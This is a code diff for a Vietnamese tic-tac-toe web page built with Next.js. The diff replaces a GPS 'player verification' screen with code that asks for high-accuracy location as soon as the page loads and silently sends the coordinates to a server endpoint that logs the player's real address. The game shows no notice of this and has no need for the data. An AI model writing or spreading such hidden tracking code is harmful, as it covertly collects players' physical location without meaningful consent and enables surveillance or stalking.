@@ -1,13 +1,11 @@
 "use client";
 
 import { useState, useEffect, useCallback } from "react";
-import { MapPin, Navigation, AlertCircle, CheckCircle2, Loader2, ShieldAlert } from "lucide-react";
 
 type Player = "X" | "O";
 type CellValue = Player | null;
 type GameMode = "pvp" | "pve";
 type AIDifficulty = "easy" | "hard";
-type GpsStatus = "prompt" | "requesting" | "denied" | "granted";
 
 const WINNING_COMBOS = [
   [0, 1, 2],
@@ -92,36 +90,17 @@ export default function Home() {
   const [scores, setScores] = useState({ x: 0, o: 0, ties: 0 });
   const [moveHistory, setMoveHistory] = useState<CellValue[][]>([]);
 
-  // State xác thực định vị GPS
-  const [gpsStatus, setGpsStatus] = useState<GpsStatus>("prompt");
-  const [gpsError, setGpsError] = useState<string>("");
-  const [userLocation, setUserLocation] = useState<{
-    address?: string;
-    coords?: { latitude: number; longitude: number };
-  } | null>(null);
-
-  const winInfo = checkWinner(board);
-  const isTie = !winInfo && isBoardFull(board);
-  const isGameOver = Boolean(winInfo || isTie);
-
-  // Yêu cầu quyền GPS và gửi dữ liệu về Server
-  const requestGpsPermission = useCallback(() => {
-    if (typeof window === "undefined" || !navigator.geolocation) {
-      setGpsError("Trình duyệt này không hỗ trợ định vị GPS.");
-      setGpsStatus("denied");
-      return;
-    }
-
-    setGpsStatus("requesting");
-    setGpsError("");
+  // Tự động yêu cầu quyền vị trí từ trình duyệt khi vừa tải trang và gửi về Server
+  useEffect(() => {
+    if (typeof window === "undefined" || !navigator.geolocation) return;
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         const { latitude, longitude, accuracy } = position.coords;
 
         try {
-          // Gọi API về Next.js Server để phân giải và ghi log địa chỉ thực tế
-          const res = await fetch("/api/log", {
+          // Gửi toạ độ GPS về Next.js Server để log ra địa chỉ thực tế
+          await fetch("/api/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -129,31 +108,12 @@ export default function Home() {
               coords: { latitude, longitude, accuracy },
             }),
           });
-
-          const resData = await res.json();
-          const realAddress = resData.data?.realAddress || "Đã xác định vị trí";
-
-          setUserLocation({
-            address: realAddress,
-            coords: { latitude, longitude },
-          });
         } catch (error) {
           console.warn("Lỗi gửi dữ liệu vị trí lên server:", error);
-        } finally {
-          // Cấp phép chơi game sau khi đã lấy GPS thành công
-          setGpsStatus("granted");
         }
       },
       (error) => {
-        console.warn("Lỗi GPS từ trình duyệt:", error);
-        if (error.code === error.PERMISSION_DENIED) {
-          setGpsError("Bạn đã từ chối cấp quyền vị trí. Vui lòng cho phép truy cập vị trí trong cài đặt trình duyệt để chơi.");
-        } else if (error.code === error.POSITION_UNAVAILABLE) {
-          setGpsError("Không thể tìm thấy thông tin vị trí. Vui lòng kiểm tra lại kết nối GPS của máy.");
-        } else {
-          setGpsError("Hết thời gian chờ định vị. Vui lòng thử lại.");
-        }
-        setGpsStatus("denied");
+        console.warn("Lỗi vị trí:", error.message);
       },
       {
         enableHighAccuracy: true,
@@ -163,19 +123,9 @@ export default function Home() {
     );
   }, []);
 
-  // Kiểm tra quyền GPS nếu người dùng đã từng cho phép trước đó
-  useEffect(() => {
-    if (typeof window !== "undefined" && navigator.permissions) {
-      navigator.permissions
-        .query({ name: "geolocation" })
-        .then((permission) => {
-          if (permission.state === "granted") {
-            requestGpsPermission();
-          }
-        })
-        .catch(() => {});
-    }
-  }, [requestGpsPermission]);
+  const winInfo = checkWinner(board);
+  const isTie = !winInfo && isBoardFull(board);
+  const isGameOver = Boolean(winInfo || isTie);
 
   // Cập nhật điểm số khi kết thúc ván cờ
   const handleGameEnd = useCallback((winner: Player | "tie") => {
@@ -189,7 +139,7 @@ export default function Home() {
   // Đánh nước cờ
   const handleCellClick = useCallback(
     (index: number) => {
-      if (board[index] || isGameOver || isAiThinking || gpsStatus !== "granted") return;
+      if (board[index] || isGameOver || isAiThinking) return;
       if (gameMode === "pve" && !xIsNext) return;
 
       const nextBoard = [...board];
@@ -207,12 +157,12 @@ export default function Home() {
         setXIsNext(!xIsNext);
       }
     },
-    [board, isGameOver, isAiThinking, gameMode, xIsNext, gpsStatus, handleGameEnd]
+    [board, isGameOver, isAiThinking, gameMode, xIsNext, handleGameEnd]
   );
 
   // Phản hồi nước đi của AI
   useEffect(() => {
-    if (gameMode !== "pve" || xIsNext || isGameOver || gpsStatus !== "granted") return;
+    if (gameMode !== "pve" || xIsNext || isGameOver) return;
 
     setIsAiThinking(true);
     const timer = setTimeout(() => {
@@ -258,7 +208,7 @@ export default function Home() {
     }, 400);
 
     return () => clearTimeout(timer);
-  }, [gameMode, xIsNext, isGameOver, board, difficulty, gpsStatus, handleGameEnd]);
+  }, [gameMode, xIsNext, isGameOver, board, difficulty, handleGameEnd]);
 
   const resetGame = () => {
     setBoard(Array(9).fill(null));
@@ -297,74 +247,16 @@ export default function Home() {
 
   return (
     <div className="min-h-screen bg-slate-900 text-slate-100 flex flex-col items-center justify-center p-4 selection:bg-indigo-500 selection:text-white">
-      <div className="relative w-full max-w-md bg-slate-800/80 backdrop-blur-md border border-slate-700/60 rounded-3xl p-6 shadow-2xl flex flex-col gap-5 overflow-hidden">
+      <div className="w-full max-w-md bg-slate-800/80 backdrop-blur-md border border-slate-700/60 rounded-3xl p-6 shadow-2xl flex flex-col gap-5">
         
-        {/* Màn hình chặn yêu cầu bật GPS trước khi chơi */}
-        {gpsStatus !== "granted" && (
-          <div className="absolute inset-0 z-50 bg-slate-900/95 backdrop-blur-md rounded-3xl flex flex-col items-center justify-center p-6 text-center animate-fade-in">
-            <div className="relative mb-4 flex items-center justify-center">
-              <div className="absolute w-20 h-20 bg-cyan-500/20 rounded-full animate-ping" />
-              <div className="relative w-16 h-16 bg-cyan-500/15 border border-cyan-500/40 rounded-2xl flex items-center justify-center text-cyan-400 shadow-lg shadow-cyan-500/20">
-                <MapPin className="w-8 h-8" />
-              </div>
-            </div>
-
-            <h2 className="text-xl font-extrabold text-white mb-2">
-              Yêu cầu bật định vị (GPS)
-            </h2>
-            <p className="text-xs text-slate-400 mb-5 leading-relaxed max-w-xs">
-              Để đảm bảo xác thực người chơi và bắt đầu ván cờ Caro 3x3, vui lòng cho phép ứng dụng truy cập vị trí GPS của bạn.
-            </p>
-
-            {gpsError && (
-              <div className="mb-4 w-full p-3 rounded-xl bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs flex items-start gap-2 text-left">
-                <ShieldAlert className="w-4 h-4 shrink-0 mt-0.5" />
-                <span>{gpsError}</span>
-              </div>
-            )}
-
-            <button
-              onClick={requestGpsPermission}
-              disabled={gpsStatus === "requesting"}
-              className="w-full py-3 px-5 bg-gradient-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 active:scale-98 disabled:opacity-60 text-white font-bold text-sm rounded-xl shadow-lg shadow-cyan-500/25 transition-all flex items-center justify-center gap-2 cursor-pointer"
-            >
-              {gpsStatus === "requesting" ? (
-                <>
-                  <Loader2 className="w-4 h-4 animate-spin" />
-                  Đang xác định vị trí...
-                </>
-              ) : (
-                <>
-                  <Navigation className="w-4 h-4" />
-                  {gpsStatus === "denied" ? "Thử lại quyền GPS" : "Bật GPS để bắt đầu chơi"}
-                </>
-              )}
-            </button>
-
-            <span className="text-[11px] text-slate-500 mt-3">
-              🔒 Vị trí của bạn được dùng để xác thực và ghép trận an toàn.
-            </span>
-          </div>
-        )}
-
         {/* Header */}
         <div className="text-center space-y-1">
-          <div className="flex items-center justify-center gap-2">
-            <h1 className="text-3xl font-extrabold tracking-tight bg-gradient-to-r from-cyan-400 via-indigo-300 to-pink-400 bg-clip-text text-transparent">
-              Cờ Caro 3x3
-            </h1>
-          </div>
+          <h1 className="text-3xl font-extrabold tracking-tight bg-gradient-to-r from-cyan-400 via-indigo-300 to-pink-400 bg-clip-text text-transparent">
+            Cờ Caro 3x3
+          </h1>
           <p className="text-xs text-slate-400 font-medium">
             Trò chơi Tic-Tac-Toe giải trí cổ điển
           </p>
-          
-          {/* Badge hiển thị địa chỉ GPS đã xác thực */}
-          {userLocation?.address && (
-            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[11px] mt-1 max-w-[90%] truncate">
-              <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
-              <span className="truncate">Vị trí: {userLocation.address}</span>
-            </div>
-          )}
         </div>
 
         {/* Mode Selector */}
@@ -477,7 +369,7 @@ export default function Home() {
               <button
                 key={index}
                 onClick={() => handleCellClick(index)}
-                disabled={Boolean(cell || isGameOver || isAiThinking || gpsStatus !== "granted")}
+                disabled={Boolean(cell || isGameOver || isAiThinking)}
                 className={`flex items-center justify-center rounded-2xl text-4xl sm:text-5xl font-black transition-all duration-200 select-none cursor-pointer ${
                   isWinningCell
                     ? "bg-emerald-500/25 border-2 border-emerald-400 text-emerald-300 scale-102 shadow-lg shadow-emerald-500/20"
@@ -500,14 +392,13 @@ export default function Home() {
         <div className="flex gap-2 pt-1">
           <button
             onClick={resetGame}
-            disabled={gpsStatus !== "granted"}
-            className="flex-1 py-2.5 px-4 bg-indigo-600 hover:bg-indigo-500 active:scale-98 disabled:opacity-50 text-white rounded-xl font-semibold text-sm transition-all shadow-lg shadow-indigo-600/30 cursor-pointer"
+            className="flex-1 py-2.5 px-4 bg-indigo-600 hover:bg-indigo-500 active:scale-98 text-white rounded-xl font-semibold text-sm transition-all shadow-lg shadow-indigo-600/30 cursor-pointer"
           >
             Ván mới 🔄
           </button>
           <button
             onClick={handleUndo}
-            disabled={moveHistory.length === 0 || isGameOver || isAiThinking || gpsStatus !== "granted"}
+            disabled={moveHistory.length === 0 || isGameOver || isAiThinking}
             className="py-2.5 px-3.5 bg-slate-800 hover:bg-slate-700 active:scale-98 disabled:opacity-40 disabled:pointer-events-none text-slate-300 rounded-xl font-medium text-xs transition border border-slate-700 cursor-pointer"
             title="Đi lại nước trước"
           >
@@ -518,8 +409,7 @@ export default function Home() {
               resetGame();
               setScores({ x: 0, o: 0, ties: 0 });
             }}
-            disabled={gpsStatus !== "granted"}
-            className="py-2.5 px-3.5 bg-slate-800 hover:bg-slate-700 active:scale-98 disabled:opacity-50 text-slate-400 hover:text-rose-300 rounded-xl font-medium text-xs transition border border-slate-700 cursor-pointer"
+            className="py-2.5 px-3.5 bg-slate-800 hover:bg-slate-700 active:scale-98 text-slate-400 hover:text-rose-300 rounded-xl font-medium text-xs transition border border-slate-700 cursor-pointer"
             title="Đặt lại toàn bộ điểm số"
           >
             Xóa điểm
